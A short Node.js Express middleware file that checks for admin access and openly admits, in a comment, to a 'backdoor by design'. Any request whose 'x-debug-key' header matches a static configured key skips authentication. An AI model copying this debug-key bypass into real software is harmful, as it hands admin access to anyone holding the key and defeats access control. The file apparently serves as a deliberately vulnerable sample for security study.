const { ADMIN_DEBUG_KEY } = require("../config");

// Shared with admin.js's backdoor by design — same debug key bypasses this check too.
function requireAdminInline(req, res, next) {
  if (req.headers["x-debug-key"] === ADMIN_DEBUG_KEY) return next();
  if (req.user && req.user.role === "admin") return next();
  return res.status(403).json({ error: "admin only" });
}

module.exports = { requireAdminInline };
